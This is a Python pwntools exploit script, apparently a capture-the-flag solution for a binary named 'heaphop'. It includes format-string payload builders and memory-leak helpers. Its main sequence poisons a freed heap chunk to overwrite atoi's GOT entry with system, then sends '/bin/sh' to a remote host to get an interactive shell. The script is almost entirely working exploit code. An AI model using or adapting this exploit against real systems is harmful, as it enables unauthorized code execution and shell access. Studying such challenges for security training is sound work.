#!/usr/bin/python
# encoding: utf-8
from  pwn import *
import time
import sys
binaire='heaphop'
TIME=0.02
if (len(sys.argv)>1):
    elf=ELF(binaire)
    libc=ELF('libc.so.6')
    host='localhost'
    port=59995
else:
    elf=ELF(binaire)
    libc=ELF('libc.so.6')
    host='89.38.210.128'
    port=1339

def hexa(c):
    s=hex(ord(c))[2:]
    if (len(s) == 1):
        s="0"+s
    return(s)


def toprint(c):
    if ((ord(c) < 32) or (ord(c) > 128)):
        return(".")
    else:
        return(c)

def baseN(num,b,nb=8,sg=0):
        n=num
        if ((sg>0) and (n<0)):
            ss="-"
            n=-n
        else:
            ss=""
        s=""
        while (n < 0):
                n = n + (b**nb)
        numerals="0123456789abcdefghijklmnopqrstuvwxyz"
        while((nb>0) or (n != 0)):
                s=numerals[n % b]+s
                n=n//b
                nb=nb-1
        return ss+s

def dump(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,8)+" : "),
        print hexa(buffer[l]),
        s=s+toprint(buffer[l])
        l=l+1
        if (l % 4 == 0):
            print " ",
            s=s+" "
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",s
            s=""
    print " ",s
def word(t):
    p=1
    s=0
    for i in range(4):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def bword(t):
    p=1
    s=0
    for i in range(8):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def complete(t,l,c="\x00"):
    if (len(t)< l):
        return(t+(l-len(t))*c)
    else:
        return(t)


def dumpg(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16),
#        s=s+toprint(buffer[l])
        l=l+8
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",""
    print " "
def dumpgc(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %8 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16)
        l=l+8
#        s=s+toprint(buffer[l])
    print " "

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)
# routine de format

def strl(n,l=5):
    s=str(n)
    s="0"*max(0,l-len(s))+s
    return(s)

def fmt(x):
    if (x < 8):
        return("A"*x)
    return("%"+str(x)+"x")


def lchaine(lwhat,offset,nb=4):
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$hn"
    for c in lnom:
        fm=fmt(c[0]-ind)+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

def lchaineverif(lwhat,offset,nb=4):
    if (nb==4):
        vv='8x'
    else:
        vv='lx'
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$"+vv
    for c in lnom:
        fm="F"*len(fmt(c[0]-ind))+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

debug=1

def pdebug(s):
    if (debug==1):
        print s
    return(s)

def tolibc(s):
    return(libc.sym[s]-libc.sym[reference_libc]+adr_reference_libc)

def whatis(s):
    print s," = ",hex(tolibc(s))


############

def lire():
    r=p.recvuntil("\n //")
#    print r
    i=r.index("\n             //")
    r=r[i+len("\n             //"):]
    j=r.index("\n            //")
    return(r[:j])

def lireoffset(i):
    p.send("%"+str(i)+"$08x\n")
    time.sleep(TIME)
    b=lire()
    return(b[0:8])


def lireptroffset(i):
    global p
    p.send("%"+str(i)+"$s\n")
    time.sleep(TIME)
    try:
        b=lire()
        b=b[:b.index('                              /')]
    except:
        b="ERREUR"
        p.close()
        p=remote(host,port)
    return(b)


def getzone(a):
    p.sendline(p32(a)+"%7$s")
    b=lire()
    return(b)

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)


def waitmenu():
    return(p.recvuntil(">"))

def alloc():
    p.sendline("1")
    return(waitmenu())

def free():
    p.sendline("4")
    return(waitmenu())

def ecrit(s):
    p.sendline("2")
    p.send(s+chr(4))
    return(waitmenu())

def lit():
    p.sendline("3")
    return(waitmenu())

p=remote(host,port)

waitmenu()
alloc()
free()
ecrit(p64(elf.got['atoi']))
alloc()
alloc()
b=lit()
b=b[1:65]
dumpg(0,b)
reference_libc='free'
#adr_reference_libc=bword(b[0:8])
#shell=p64(tolibc('system'))
shell=p64(elf.plt['system'])
pause()
ecrit(shell)
'''
alloc()
ecrit("/bin/sh\x00")
p.sendline("4")
'''
p.sendline("/bin/sh")
p.interactive()
'''
0000000000000000 :  00007fa1b20533e0   00007fa1b203c460
0000000000000010 :  00007fa1b20c80b0   00000000004006f6
0000000000000020 :  00007fa1b2044000   00007fa1b200bdc0     
0000000000000030 :  00007fa1b2020d90   00007fa1b209ca80     

0x602018:	0x0000000000400710	0x00007fa1b203c460
0x602028:	0x00007fa1b20c80b0	0x00000000004004f6
0x602038:	0x00007fa1b2044000	0x00007fa1b200bdc0
0x602048:	0x00007fa1b2020d90	0x00007fa1b209ca80
'''
